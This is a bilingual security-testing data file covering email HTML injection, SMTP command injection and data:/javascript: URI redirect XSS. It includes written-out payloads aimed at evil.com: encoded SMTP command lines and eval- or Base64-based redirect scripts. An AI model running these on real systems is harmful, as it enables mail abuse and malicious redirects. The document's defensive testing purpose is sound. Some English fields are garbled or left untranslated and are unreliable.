analysis.en: Positive evidence requires attacker HTML to remain an unintended active element after target-client sanitization, such as a misleading link or automatic external-resource request; script XSS needs separate actual marker execution. False-positive boundary: Normal h1 or link support in HTML mail, iframe or script in source, plain-text display, default image blocking, explicit user click on a safe link, or Webmail CSP blocking does not prove XSS.

opsecTips.zh: HTML 邮件测试不含真实钓鱼、凭据表单、javascript 或第三方像素；出现非测试收件人、自动外连携带数据、脚本、下载或品牌冒用时停止。
opsecTips.en: HTML email testing contains no real phishing, credential forms, javascript, or third-party pixels; stop on nontest recipients, automatic data-bearing egress, script, downloads, or brand impersonation.

opsecTips.zh: 删除隔离邮件/队列/资源 token，清理 Webmail/客户端缓存和访问日志，恢复 HTML sanitizer/CSP 并回归允许标签。
opsecTips.en: Delete isolated messages, queues, and resource tokens, clear Webmail and client caches plus access logs, restore the HTML sanitizer and CSP, and regress allowed tags.

title.zh: 建立多客户端邮件基线

description.zh: 发送转义文本和允许链接，记录网关处理、最终 MIME 与各客户端 DOM。
description.en: Send escaped text and an allowed link and record gateway processing, final MIME, and each client DOM.

title.zh: 回放活动 HTML 元素

description.zh: 提交原始元素集合并按客户端捕获最终 DOM、远程请求、协议和用户交互。
description.en: Submit the original element set and capture final DOM, remote requests, schemes, and user interaction per client.

attackChain.payload:
Injected HTML

Click here Click

title.zh: 净化并逐客户端回归

description.zh: 部署 allowlist 净化和远程资源限制后重放，确认允许格式保留且活动内容消失。
description.en: Replay after allowlist sanitization and remote-resource restrictions to preserve formatting while removing active content.

overview.zh: 原集合包含标题、链接、javascript:、iframe、@import、link 和背景资源。多数现代邮件客户端禁止脚本和 iframe，但仍可能保留钓鱼链接、远程跟踪或危险 CSS；必须按支持的客户端分别记录净化结果。
overview.en: The source includes headings, links, javascript schemes, iframes, imports, link elements, and background resources. Most modern mail clients block scripts and iframes, while phishing links, remote tracking, or unsafe CSS can remain, so sanitization results must be recorded per supported client.

vulnerability.zh: 邮件模板若把用户字段当作可信 HTML 拼接，发送端净化与客户端二次解析之间可能保留活动元素、属性或外部资源。由于邮件通常位于独立文档源，影响不应自动等同网站会话 XSS，而应按实际客户端能力描述。
vulnerability.en: If a mail template concatenates user fields as trusted HTML, active elements, attributes, or external resources can survive sender sanitization and client reparsing. Because mail is usually an isolated document origin, impact should not automatically be equated with website-session XSS and must reflect actual client capabilities.

exploitation.zh: 步骤一发送只含转义文本与允许链接的基线邮件；步骤二逐项回放原始 HTML，在 Webmail、桌面和移动客户端记录最终 DOM、资源请求和点击目标；步骤三禁用远程内容并使用纯文本替代部分对照，排除发送端预览、邮件安全网关主动扫描或客户端自动链接造成的假阳性。
exploitation.en: First send a baseline message containing escaped text and one allowed link. Replay each original HTML item and record final DOM, resource requests, and click targets in webmail, desktop, and mobile clients. Compare remote-content-disabled and plain-text alternatives to exclude sender previews, security-gateway scanning, or client autolinking as false positives.

mitigation.zh: 使用严格 allowlist HTML 净化器并删除脚本、iframe、危险协议、外部 CSS 与事件属性；对纯文本和 HTML 部分分别进行上下文编码；为可信邮件限制远程资源域名，并在每个支持客户端回归最终 DOM。
mitigation.en: Use a strict allowlist HTML sanitizer that removes scripts, iframes, dangerous schemes, external CSS, and event attributes. Encode plain-text and HTML parts for their contexts. Restrict remote-resource domains for trusted mail and regress the final DOM in every supported client.

name.zh: SMTP 命令序列注入

description.zh: 验证用户字段中的换行是否突破邮件应用层边界，向下游 SMTP 会话注入 HELO、MAIL FROM、RCPT TO、DATA 或 QUIT 命令。
description.en: Tests whether newlines in user fields escape the mail application boundary and inject HELO, MAIL FROM, RCPT TO, DATA, or QUIT commands into a downstream SMTP session.

prerequisites.zh: 用户字段在应用构造 SMTP 会话命令前未拒绝 CR/LF，且下游收到的原始 HELO/MAIL FROM/RCPT TO/DATA/QUIT 序列可抓取。
prerequisites.en: A user field does not reject CR or LF before application construction of SMTP commands, and the downstream raw HELO, MAIL FROM, RCPT TO, DATA, and QUIT sequence is capturable.

prerequisites.zh: 使用不转发邮件的隔离 SMTP transcript sink 和专用 marker 地址，单连接保存应用写入字节、服务器命令解析和队列状态。
prerequisites.en: A nonforwarding isolated SMTP transcript sink and dedicated marker addresses preserve application-written bytes, server command parsing, and queue state on one connection.

title.zh: SMTP命令注入 (HELO/MAIL FROM/RCPT TO)
title.en: Validation step 1 for SMTP Command-Sequence Injection

execution.command:
HELO evil.com

HELO evil.com

MAIL FROM:<attacker@evil.com>

MAIL FROM:<attacker@evil.com>

RCPT TO:<attacker@evil.com>

RCPT TO:<attacker@evil.com>
%0aHELO evil.com
%0d%0aHELO evil.com
%0aMAIL FROM:<attacker@evil.com>
%0d%0aMAIL FROM:<attacker@evil.com>
%0aRCPT TO:<attacker@evil.com>
%0d%0aRCPT TO:<attacker@evil.com>

DATA
Subject: Injected

Injected body
.


DATA
Subject: Injected

Injected body
.


QUIT

QUIT
%0aQUIT
%0d%0aQUIT

description.zh: SMTP命令注入 (HELO/MAIL FROM/RCPT TO)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this SMTP Command-Sequence Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是可控换行结束原应用值并让下游 SMTP parser 接受一个额外独立命令，原始 transcript 和解析事件与输入对应。 假阳性边界：命令字符串出现在邮件正文/日志、SMTP server 返回语法错误、库重新编码换行、连接本就发送正常 HELO/MAIL、额外命令未被 parser 接受或 sink 模拟均不是注入。
analysis.en: Positive evidence requires a controlled newline to terminate the original application value and have the downstream SMTP parser accept an additional distinct command, correlating raw transcript and parse event with input. False-positive boundary: Command text in a body or log, an SMTP syntax error, library newline re-encoding, normal HELO or MAIL commands, an unaccepted extra command, or sink simulation does not prove injection.

opsecTips.zh: SMTP 命令测试仅向不投递 sink 发送一个无害 NOOP/marker，禁止真实 RCPT/DATA；出现外部收件人、排队邮件、多连接、退信或 MTA 状态变化时停止。
opsecTips.en: SMTP command testing sends one harmless NOOP or marker to a nonforwarding sink and forbids real RCPT or DATA; stop on external recipients, queued mail, multiple connections, bounces, or MTA-state changes.

opsecTips.zh: 关闭连接和 transcript sink，删除队列/marker/抓包，清理应用/MTA 日志，恢复命令参数 CRLF 校验并回归正常发送。
opsecTips.en: Close connections and the transcript sink, delete queues, markers, and captures, clear application and MTA logs, restore CRLF validation for command arguments, and regress normal sending.

title.zh: 保存正常 SMTP 状态机
title.en: Preserve the normal SMTP state machine

description.zh: 在隔离服务器记录正常邮件的每条客户端命令、服务器回复和状态迁移。
description.en: Record every client command, server reply, and state transition for a normal message on an isolated server.

title.zh: 注入额外协议命令

description.zh: 回放原始 HELO/MAIL/RCPT/DATA 变体并验证是否形成额外有效状态迁移。
description.en: Replay the original HELO, MAIL, RCPT, and DATA variants and verify whether they create additional valid state transitions.

attackChain.payload:
HELO evil.com

HELO evil.com

MAIL FROM:<attacker@evil.com>

MAIL FROM:<attacker@evil.com>

RCPT TO:<attacker@evil.com>

RCPT TO:<attacker@evil.com>
%0aHELO evil.com
%0d%0aHELO evil.com
%0aMAIL FROM:<attacker@evil.com>
%0d%0aMAIL FROM:<attacker@evil.com>
%0aRCPT TO:<attacker@evil.com>
%0d%0aRCPT TO:<attacker@evil.com>

DATA
Subject: Injected

Injected body
.


DATA
Subject: Injected

Injected body
.


QUIT

QUIT
%0aQUIT
%0d%0aQUIT

title.zh: 采用结构化 SMTP 客户端

description.zh: 禁止原始命令拼接后重放，确认正常信封与正文保留且注入行不再离开应用。
description.en: Replay after prohibiting raw command concatenation to preserve normal envelope and body behavior while preventing injected lines from leaving the application.

overview.zh: 该集合比邮件 Header 注入更低一层，尝试控制 SMTP 会话命令和信封。现代邮件库通常不会把 Header 换行传到命令通道，因此必须在隔离 SMTP 服务器的原始会话日志中看到额外命令，而不是只看 MIME。
overview.en: This set targets a layer below mail-header injection and attempts to control SMTP session commands and the envelope. Modern mail libraries usually do not pass header newlines into the command channel, so extra commands must appear in raw session logs from an isolated SMTP server, not only in MIME.

vulnerability.zh: 自建 SMTP 客户端、命令字符串拼接或协议代理若没有区分参数与 CRLF 分帧，用户输入可结束当前命令并增加收件人或消息。不同服务器状态机会拒绝顺序错误，因此出现 5xx 或连接断开不是成功。
vulnerability.en: A custom SMTP client, command-string concatenation, or protocol proxy that fails to separate arguments from CRLF framing can let user input terminate one command and add recipients or messages. Server state machines may reject invalid ordering, so a 5xx response or disconnect is not success.

exploitation.zh: 步骤一用正常邮件记录 EHLO、MAIL、RCPT、DATA、QUIT 的完整会话顺序；步骤二在隔离捕获服务回放原始命令注入变体，比较客户端发出的真实行和服务器状态；步骤三切换到成熟 SMTP 库后重放，排除 MIME 正文字符串、服务端 banner 或故意测试脚本造成的假阳性。
exploitation.en: First record the complete EHLO, MAIL, RCPT, DATA, and QUIT sequence for a normal message. Replay the original command-injection variants against an isolated capture service and compare actual client lines with server state. Retest with a mature SMTP library to exclude MIME body strings, server banners, or intentionally scripted test commands as false positives.

mitigation.zh: 使用成熟 SMTP 客户端 API 分别设置信封、Header 与正文；拒绝所有协议参数中的 CR/LF 和控制字符并禁止原始命令拼接；限制下游 SMTP 账户的发件域、收件域与速率，并记录异常命令顺序。
mitigation.en: Use a mature SMTP client API that separates envelope, headers, and body. Reject CR, LF, and controls in every protocol argument and prohibit raw command concatenation. Restrict sender and recipient domains and rates for downstream accounts and log anomalous command ordering.

name.zh: data: URI 重定向活动文档

description.zh: 验证 data:text/html 载荷是否在导航 Sink 中创建活动文档，并通过 meta refresh 或脚本把用户带到外部站点。
description.en: Tests whether a data:text/html input creates an active document in a navigation sink and redirects the user to an external site through meta refresh or script.

subCategory.zh: Data URI 导航脚本执行

prerequisites.zh: 重定向或导航 Sink 允许 data:text/html，目标浏览器创建活动文档并允许 meta refresh 或脚本改变 location，sandbox/CSP 已确认。
prerequisites.en: A redirect or navigation sink permits data:text/html, and the target browser creates an active document allowing meta refresh or script location changes, with sandbox and CSP confirmed.

prerequisites.zh: data 文档只导航到自有空页面并带唯一 token，不执行 eval；记录初始 Sink、data 文档 origin、meta/script 事件和最终 URL。
prerequisites.en: The data document navigates only to an owned empty page with a unique token and does not use eval, recording initial sink, data-document origin, meta or script event, and final URL.

title.zh: data: URI重定?
title.en: Validation step 1 for Data-URI Redirect Active Document

description.zh: data: URI重定?包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Data-URI Redirect Active Document validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是应用接受 data URI，浏览器将其解析为活动文档并由 meta/script 触发到自有目标的实际导航，两个导航阶段可关联。 假阳性边界：data URI 显示/下载、浏览器禁顶层 data、Base64 可解码、脚本被 sandbox/CSP 阻止、外部 URL 只在文本中、手工打开 URI 或普通开放重定向均不是活动链。
analysis.en: Positive evidence requires the application to accept the data URI, the browser to parse it as an active document, and meta or script to trigger actual navigation to the owned target, correlating both navigation stages. False-positive boundary: Displayed or downloaded data URIs, blocked top-level data navigation, decodable Base64, script blocked by sandbox or CSP, an external URL only in text, manual opening, or an ordinary redirect does not prove the active chain.

opsecTips.zh: Data URI 重定向只到自有空页且单次，禁止 opener/top 数据访问、公共域和 eval；出现窗口链、下载、外连数据、历史循环或非测试用户时停止。
opsecTips.en: Data-URI redirect testing navigates once to an owned empty page and forbids opener or top data access, public origins, and eval; stop on window chains, downloads, data-bearing egress, history loops, or nontest users.

opsecTips.zh: 关闭 data/目标文档，删除 URI/token/marker，清理 history/BFCache/站点数据和目标日志，恢复 scheme allowlist。
opsecTips.en: Close data and target documents, delete URIs, tokens, and markers, clear history, BFCache, site data, and destination logs, and restore scheme allowlists.

title.zh: 建立活动文档导航对照

description.zh: 记录 data:text/plain、普通 HTTPS 和无导航 HTML 在目标 Sink 中的浏览器行为。
description.en: Record browser behavior for data:text/plain, ordinary HTTPS, and nonnavigating HTML in the target sink.

title.zh: 执行 meta 与编码脚本

description.zh: 回放原始集合并记录文档创建、脚本或 meta 触发、CSP 决策和最终 URL。
description.en: Replay the original set and record document creation, script or meta trigger, CSP decision, and final URL.

attackChain.payload:
data:text/html,<meta http-equiv="refresh" content="0;url=https://evil.com">
data:text/html;base64,PGRpdiBpZD0idGVzdCI+PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20iPC9zY3JpcHQ+PC9kaXY+
data:text/html,<script>eval(atob('d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tIg=='))</script>

title.zh: 强制安全导航协议

description.zh: 部署协议白名单与 CSP 后重放，确认业务 HTTPS 导航保留而活动 data 文档被拒绝。
description.en: Replay after scheme allowlisting and CSP to preserve business HTTPS navigation while rejecting active data documents.

overview.zh: 原集合包含 meta refresh、Base64 HTML 与 atob/eval 脚本。与 inject2-uri 相比，这里更集中于活动文档的外部导航行为，但根因仍是 data: 危险协议进入浏览器可执行上下文，而不是服务端 302。
overview.en: The source combines meta refresh, Base64 HTML, and atob or eval script. Compared with the other data-URI set, this one focuses on external navigation from an active document, but the root cause remains a data scheme reaching an executable browser context rather than a server 302.

vulnerability.zh: 链接、iframe 或 location 接受完整用户 URI，而校验器只查找 http 主机或禁止明文 script 时，编码的 data:text/html 仍可创建独立文档并导航。浏览器、CSP 和用户手势决定 meta/script 是否生效，必须真实执行。
vulnerability.en: 链接、iframe 或 location 接受完整用户 URI，而校验器只查找 http 主机或禁止明文 script 时，编码的 data:text/html 仍可创建独立文档并导航。浏览器、CSP 和用户手势决定 meta/script 是否生效，必须真实执行。

exploitation.zh: 步骤一用 data:text/plain 与普通 HTTPS 导航建立文档和跳转基线；步骤二回放原始 meta/Base64/eval 变体并捕获页面源、CSP、计时和最终 URL；步骤三在纯文本 Sink、禁用 data: 和禁用脚本策略下对照，排除解码预览、地址栏显示或扫描器识别 evil.com 造成的假阳性。
exploitation.en: First establish document and navigation baselines with data:text/plain and ordinary HTTPS. Replay the original meta, Base64, and eval variants and capture page origin, CSP, timing, and final URL. Compare plain-text sinks and policies disabling data and script to exclude decoder previews, address-bar display, or scanner recognition of evil.com as false positives.

mitigation.zh: 导航目标只允许服务端映射或标准解析后的 http/https；拒绝 data:、javascript: 和未知协议，并在解码后再验证；通过 CSP 限制 frame-src、object-src 与 script-src，避免对用户 URI 进行 eval 或字符串执行。
mitigation.en: Allow navigation only through server mappings or parsed HTTP and HTTPS URLs. Reject data, javascript, and unknown schemes and validate after decoding. Restrict frame-src, object-src, and script-src with CSP and never eval or string-execute user URIs.

name.zh: javascript: URI 重定向脚本变体

description.zh: 验证 javascript: URI 中的 window.open、location、eval 和定时器变体能否绕过输入校验并在浏览器中执行外部导航。
description.en: Tests whether window.open, location, eval, and timer variants in javascript URIs bypass input validation and execute external navigation in the browser.

prerequisites.zh: 用户值进入可执行 javascript: 导航 Sink，目标浏览器允许 window.open/location/eval/定时器变体，且触发所需用户手势可模拟。
prerequisites.en: A user value reaches an executable javascript: navigation sink, the target browser permits window.open, location, eval, or timer variants, and required user gestures are simulatable.

prerequisites.zh: 所有外部导航替换为自有空页面，eval/定时器只调用固定 marker，记录 DOM 属性、点击/手势、弹窗策略、调用栈和最终 URL。
prerequisites.en: All external navigation points to an owned empty page, eval and timers call only a fixed marker, and DOM attributes, click or gesture, popup policy, call stack, and final URL are recorded.

title.zh: javascript:重定?
title.en: Validation step 1 for Java Script-URI Redirect Script Variants

description.zh: javascript:重定?包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Java Script-URI Redirect Script Variants validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是应用真实 Sink 接受 javascript: 变体并在目标页面来源执行 marker 或受控导航；每个 window.open/location/timer 分支需对应触发证据。 假阳性边界：javascript 字符串回显、弹窗被阻止、需控制台手工调用、普通链接导航、CSP 阻止 eval、定时器未触发、URL 解析错误或静态扫描命中均不是成功。
analysis.en: Positive evidence requires the real application sink to accept a javascript: variant and execute the marker or controlled navigation under the target-page origin, with branch-specific evidence for window.open, location, or timers. False-positive boundary: Reflected javascript text, popup blocking, manual console invocation, ordinary link navigation, CSP-blocked eval, an unfired timer, URL parse errors, or static scanner matches does not prove success.

opsecTips.zh: JavaScript URI 变体禁止公共域、真实弹窗链、cookie/storage 和长期定时器；出现多窗口、外连、数据读取、历史循环或非测试会话时停止。
opsecTips.en: Java Script-URI variants forbid public origins, real popup chains, cookies or storage, and long timers; stop on multiple windows, egress, data reads, history loops, or nontest sessions.

opsecTips.zh: 关闭弹窗/页面，取消测试定时器，删除链接/marker/token，清理 history/BFCache/站点数据和目标日志，恢复协议过滤。
opsecTips.en: Close popups and pages, cancel test timers, delete links, markers, and tokens, clear history, BFCache, site data, and destination logs, and restore scheme filtering.

title.zh: 固定危险协议策略基线

description.zh: 记录普通 HTTPS 和基础 javascript: 在目标 DOM Sink 中的解析与 CSP 决策。
description.en: Record parsing and CSP decisions for ordinary HTTPS and a basic javascript URI in the target DOM sink.

title.zh: 回放等价导航 API

description.zh: 提交原始 window/eval/timer 变体并捕获 DOM 属性、调用栈与最终浏览器导航。
description.en: Submit the original window, eval, and timer variants and capture DOM properties, call stacks, and final browser navigation.

attackChain.payload:
javascript:window.open('https://evil.com')
javascript:void(window.location='https://evil.com')
javascript:void(document.location='https://evil.com')
javascript:void(location.href='https://evil.com')
javascript:void(location='https://evil.com')
javascript:eval('window.location="https://evil.com"')
javascript:eval('document.location="https://evil.com"')
javascript:eval(atob('d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tIg=='))
javascript:setTimeout('window.location="https://evil.com"')
javascript:setInterval('window.location="https://evil.com"')

title.zh: 统一协议与代码 Sink 防护

description.zh: 部署协议 allowlist、CSP 和 Trusted Types 后重放，确认允许链接保留且所有等价脚本均失效。
description.en: Replay after scheme allowlisting, CSP, and Trusted Types to preserve allowed links while disabling every equivalent script form.

overview.zh: 原集合围绕 javascript: 协议内不同 JavaScript API 和 Base64 解码构造导航。虽然可观察结果是外部跳转，但不存在服务端 Location，漏洞边界是用户 URI 被浏览器当代码执行，因此应归 DOM XSS。
overview.en: The source varies Java Script AP Is and Base64 decoding inside the javascript scheme to construct navigation. Although the visible result is an external redirect, there is no server Location; the boundary is a user URI executed as browser code, so it is DOM XSS.

vulnerability.zh: 应用若只过滤字面 window.location 或按字符串黑名单阻止少量模式，eval、void、setTimeout 和 window.open 等语义等价形式仍可运行。协议解析、HTML 实体、URL 解码和 DOM 赋值顺序共同决定绕过。
vulnerability.en: 应用若只过滤字面 window.location 或按字符串黑名单阻止少量模式，eval、void、set Timeout 和 window.open 等语义等价形式仍可运行。协议解析、HTML 实体、URL 解码和 DOM 赋值顺序共同决定绕过。

exploitation.zh: 步骤一用普通 HTTPS 与被拒绝的基础 javascript:alert 建立协议策略基线；步骤二逐项回放原始 API 变体，记录最终 DOM 值、JavaScript 调用栈、弹窗/导航和 CSP；步骤三用不执行的文本属性、禁用 eval 与严格 CSP 对照，排除字符串回显、弹窗阻止或扫描器模式匹配造成的假阳性。
exploitation.en: First establish scheme-policy baselines with ordinary HTTPS and a rejected basic javascript alert.
